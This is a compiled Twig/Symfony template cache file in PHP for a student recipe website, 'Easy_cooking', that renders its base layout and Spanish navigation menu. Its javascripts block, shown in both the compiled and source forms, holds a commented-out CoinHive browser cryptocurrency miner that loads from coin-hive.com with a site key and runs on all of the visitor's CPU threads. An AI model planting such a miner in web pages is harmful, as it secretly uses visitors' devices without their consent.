<?php

/* base.html.twig */
class __TwigTemplate_d882acde4f4b42cd8633763c1d480248c057bf1eb49dc40eeba39fe53f81788a extends Twig_Template
{
    public function __construct(Twig_Environment $env)
    {
        parent::__construct($env);

        $this->parent = false;

        $this->blocks = array(
            'title' => array($this, 'block_title'),
            'navigation' => array($this, 'block_navigation'),
            'sidebar' => array($this, 'block_sidebar'),
            'body' => array($this, 'block_body'),
            'footer' => array($this, 'block_footer'),
            'javascripts' => array($this, 'block_javascripts'),
        );
    }

    protected function doDisplay(array $context, array $blocks = array())
    {
        $__internal_c78d68a86dbf9a9d8d0275ec55e8720674ac603fa280dd08fb2a7bcf5772d200 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_c78d68a86dbf9a9d8d0275ec55e8720674ac603fa280dd08fb2a7bcf5772d200->enter($__internal_c78d68a86dbf9a9d8d0275ec55e8720674ac603fa280dd08fb2a7bcf5772d200_prof = new Twig_Profiler_Profile($this->getTemplateName(), "template", "base.html.twig"));

        // line 1
        echo "<!DOCTYPE HTML>
<html>

<head>
\t<title>";
        // line 5
        $this->displayBlock('title', $context, $blocks);
        echo "</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"";
        // line 9
        echo twig_escape_filter($this->env, $this->env->getExtension('Symfony\Bridge\Twig\Extension\AssetExtension')->getAssetUrl("css/style.css"), "html", null, true);
        echo "\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"";
        // line 19
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t";
        // line 26
        $this->displayBlock('navigation', $context, $blocks);
        // line 37
        echo "\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t";
        // line 42
        $this->displayBlock('sidebar', $context, $blocks);
        // line 43
        echo "\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t";
        // line 48
        $this->displayBlock('body', $context, $blocks);
        // line 49
        echo "\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t";
        // line 55
        $this->displayBlock('footer', $context, $blocks);
        // line 58
        echo "\t\t</div>

\t</div>
\t";
        // line 61
        $this->displayBlock('javascripts', $context, $blocks);
        // line 69
        echo "</body>
</html>
";
        
        $__internal_c78d68a86dbf9a9d8d0275ec55e8720674ac603fa280dd08fb2a7bcf5772d200->leave($__internal_c78d68a86dbf9a9d8d0275ec55e8720674ac603fa280dd08fb2a7bcf5772d200_prof);

    }

    // line 5
    public function block_title($context, array $blocks = array())
    {
        $__internal_0f413cab0b225b20161fe2ad2cf7602b8881ff7d6d3afcd04d951164800c75ef = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_0f413cab0b225b20161fe2ad2cf7602b8881ff7d6d3afcd04d951164800c75ef->enter($__internal_0f413cab0b225b20161fe2ad2cf7602b8881ff7d6d3afcd04d951164800c75ef_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "title"));

        echo "symblog";
        
        $__internal_0f413cab0b225b20161fe2ad2cf7602b8881ff7d6d3afcd04d951164800c75ef->leave($__internal_0f413cab0b225b20161fe2ad2cf7602b8881ff7d6d3afcd04d951164800c75ef_prof);

    }

    // line 26
    public function block_navigation($context, array $blocks = array())
    {
        $__internal_157e784bea43314e160a36fee01c6ec816ac9fc64ff9481e86fa856790c7ec17 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_157e784bea43314e160a36fee01c6ec816ac9fc64ff9481e86fa856790c7ec17->enter($__internal_157e784bea43314e160a36fee01c6ec816ac9fc64ff9481e86fa856790c7ec17_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "navigation"));

        // line 27
        echo "\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"";
        // line 29
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 30
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_recetas");
        echo "\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 31
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_platos");
        echo "\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 32
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_ingredientes");
        echo "\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 33
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_contact");
        echo "\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t";
        
        $__internal_157e784bea43314e160a36fee01c6ec816ac9fc64ff9481e86fa856790c7ec17->leave($__internal_157e784bea43314e160a36fee01c6ec816ac9fc64ff9481e86fa856790c7ec17_prof);

    }

    // line 42
    public function block_sidebar($context, array $blocks = array())
    {
        $__internal_d0856fbdf8a6554d386407ab574db95c2323aed2bd7144babc90c429430ac40c = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_d0856fbdf8a6554d386407ab574db95c2323aed2bd7144babc90c429430ac40c->enter($__internal_d0856fbdf8a6554d386407ab574db95c2323aed2bd7144babc90c429430ac40c_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "sidebar"));

        
        $__internal_d0856fbdf8a6554d386407ab574db95c2323aed2bd7144babc90c429430ac40c->leave($__internal_d0856fbdf8a6554d386407ab574db95c2323aed2bd7144babc90c429430ac40c_prof);

    }

    // line 48
    public function block_body($context, array $blocks = array())
    {
        $__internal_79479ea3894a6a145fbdf6414a518c7d3ebef9bfb26b0051f1628635830f667a = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_79479ea3894a6a145fbdf6414a518c7d3ebef9bfb26b0051f1628635830f667a->enter($__internal_79479ea3894a6a145fbdf6414a518c7d3ebef9bfb26b0051f1628635830f667a_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "body"));

        
        $__internal_79479ea3894a6a145fbdf6414a518c7d3ebef9bfb26b0051f1628635830f667a->leave($__internal_79479ea3894a6a145fbdf6414a518c7d3ebef9bfb26b0051f1628635830f667a_prof);

    }

    // line 55
    public function block_footer($context, array $blocks = array())
    {
        $__internal_4b0456c5ebb70d1574eca14424362f10d0ac15743e58406c2e82705f2712e1c8 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_4b0456c5ebb70d1574eca14424362f10d0ac15743e58406c2e82705f2712e1c8->enter($__internal_4b0456c5ebb70d1574eca14424362f10d0ac15743e58406c2e82705f2712e1c8_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "footer"));

        // line 56
        echo "\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t";
        
        $__internal_4b0456c5ebb70d1574eca14424362f10d0ac15743e58406c2e82705f2712e1c8->leave($__internal_4b0456c5ebb70d1574eca14424362f10d0ac15743e58406c2e82705f2712e1c8_prof);

    }

    // line 61
    public function block_javascripts($context, array $blocks = array())
    {
        $__internal_5642063fdc79bf04ab03799851391882f288700e3c2dedacf589b8f64d24748d = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_5642063fdc79bf04ab03799851391882f288700e3c2dedacf589b8f64d24748d->enter($__internal_5642063fdc79bf04ab03799851391882f288700e3c2dedacf589b8f64d24748d_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "javascripts"));

        // line 62
        echo "<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t";
        
        $__internal_5642063fdc79bf04ab03799851391882f288700e3c2dedacf589b8f64d24748d->leave($__internal_5642063fdc79bf04ab03799851391882f288700e3c2dedacf589b8f64d24748d_prof);

    }

    public function getTemplateName()
    {
        return "base.html.twig";
    }

    public function isTraitable()
    {
        return false;
    }

    public function getDebugInfo()
    {
        return array (  201 => 62,  195 => 61,  187 => 56,  181 => 55,  170 => 48,  159 => 42,  148 => 33,  144 => 32,  140 => 31,  136 => 30,  132 => 29,  128 => 27,  122 => 26,  110 => 5,  101 => 69,  99 => 61,  94 => 58,  92 => 55,  84 => 49,  82 => 48,  75 => 43,  73 => 42,  66 => 37,  64 => 26,  54 => 19,  41 => 9,  34 => 5,  28 => 1,);
    }

    /** @deprecated since 1.27 (to be removed in 2.0). Use getSourceContext() instead */
    public function getSource()
    {
        @trigger_error('The '.__METHOD__.' method is deprecated since version 1.27 and will be removed in 2.0. Use getSourceContext() instead.', E_USER_DEPRECATED);

        return $this->getSourceContext()->getCode();
    }

    public function getSourceContext()
    {
        return new Twig_Source("<!DOCTYPE HTML>
<html>

<head>
\t<title>{% block title %}symblog{% endblock %}</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"{{ asset('css/style.css') }}\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"{{ path('cooker_cook_principal')}}\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t{% block navigation %}
\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"{{ path('cooker_cook_principal')}}\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_recetas')}}\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_platos')}}\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_ingredientes')}}\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_contact')}}\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t{% endblock %}
\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t{% block sidebar %}{% endblock %}
\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t{% block body %}{% endblock %}
\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t{% block footer %}
\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t{% endblock %}
\t\t</div>

\t</div>
\t{% block javascripts %}
<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t{% endblock %}
</body>
</html>
", "base.html.twig", "C:\\xampp\\htdocs\\EasyCooking\\app\\Resources\\views\\base.html.twig");
    }
}
